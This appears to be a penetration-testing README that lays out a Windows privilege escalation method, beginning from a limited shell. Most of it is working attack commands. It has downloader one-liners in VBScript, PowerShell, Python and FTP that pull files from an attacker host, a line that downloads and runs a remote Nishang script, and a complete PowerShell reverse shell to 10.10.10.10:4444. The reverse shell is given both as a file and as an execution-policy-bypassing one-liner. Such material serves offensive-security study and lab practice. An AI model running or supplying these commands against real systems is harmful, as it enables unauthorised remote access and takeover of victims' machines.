# Windows-Privilege-Escalation
Here is my step-by-step windows privlege escalation methodology. This guide assumes you are starting with a very limited shell like a webshell, netcat reverse shell or a remote telnet connection. 

## First things first
Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.

```
whoami
net user <username>
systeminfo
net config Workstation 
net users 
```

## Uploading files to the Windows machine  
Most of the time we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  
We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  
1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
4. FTP Downloader

Most of these will require that we create a simple local webserver on our Kali box to sevre the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX).
I like to use the Python Simple HTTP Server:
```
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80
```
Or the Python pyftpdlib FTP Server (again don't run from TMUX):
```
apt-get install python-pyftpdlib
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
```

### Uploading Files with VBScript  
First lets test to see if we can run VBScript  
```
echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
```
Now we run it to see the results:  
```
cscript testvb.vbs
```
If you see the following message, we are good to go with VBScript!:  
```
C:\Users\Test>cscript testvb.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Yes we can run vbscript!
```
If you see the following messages, you should move on to PowerShell:  
```
C:\temp>cscript testvb.vbs
This program is blocked by group policy. For more information, contact your system administrator.
C:\temp>testvb.vbs
Access is denied.
```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
```
echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```
If Windows is a newer version (Windows 10 or Server 2016), try the following code:
```
echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

Now try to download a file to the local path:  
```
cscript dl.vbs "http://10.10.10.10/archive.zip"
```

### Uploading Files with PowerShell  

Test to see if we can run Powershell:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
```

Test to see if we can run Powershell Version 2:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
```

Try to download a file from a remote server to the windows temp folder:
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"

```

### Uploading Files with Python
Sometimes a Windows machine will have development tools like Python installed.
Check for python
```
python -h
```

Download a file using Python:
```
python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"
```

### Uploading Files with FTP
After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
```
C:\Users\pwnd>ftp 10.10.10.10
Connected to 10.10.10.10
220 pyftpdlib 1.5.3 ready.
User (10.10.15.31:(none)): anonymous
331 Username ok, send password.
Password: anonymous

230 Login successful.                                                                                                                      
ftp> ls                                                                                                                                 
dir                                                                                                                                       
421 Active data channel timed out.                                                                                                       
```
If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer. 

You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.

## Upgrading your Windows Shell
You might find that you are connected with a limited shell such as a Web shell, netcat shell or Telnet connection that simply is not cutting it for you. Here are a few oneliners you can use to upgrade your shell:

### Upgrade Shell with PowerShell Nishang

https://github.com/samratashok/nishang
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/nishang.ps1'))" && SET "PATH=%PATH%;%ALLUSERSPROFILE%\code\"
```


### Upgrade Windows Command Line with Powershell Reverse Shell:

You can either upload the following Reverse shell (note you will need to se the IP and Port correctly):
*ReverseShell.ps1*  
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()             
```
Then run the Powershell command from the Windows Command line like so:
```
powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -noexit "& ""C:\Users\Public\Downloads\ReverseShell.ps1""" 
```

*OR* you can run this oneliner from the Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):
```
@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
```


### Running Mimicatz

*Easy*

**Passwords**
Passwords can be one of the easiest methods of privledge escalation and there are some tools that can help with this process.


**CopyAndPasteFileDownloader.bat**

Windows file transfer script that can be pasted to the command line. File transfers to a Windows machine can be tricky without a Meterpreter shell. The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line)

**CopyAndPasteEnum.bat**

No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial).
Copy and paste the following contents into your remote Windows shell in Kali to generate a quick report

**enumeration.md** 

Basic notes on Windows Enumeration from the OSCP.

**windows_recon.bat**

An uploadable batch file for performing basic windows enumeration.


**References**  
https://medium.com/@hakluke  
https://daya.blog/2018/01/06/windows-privilege-escalation/  
https://pentestlab.blog/2017/04/19/stored-credentials/  
https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/  
https://www.abatchy.com/
https://gist.github.com/egre55
https://github.com/egre55/ultimate-file-transfer-list



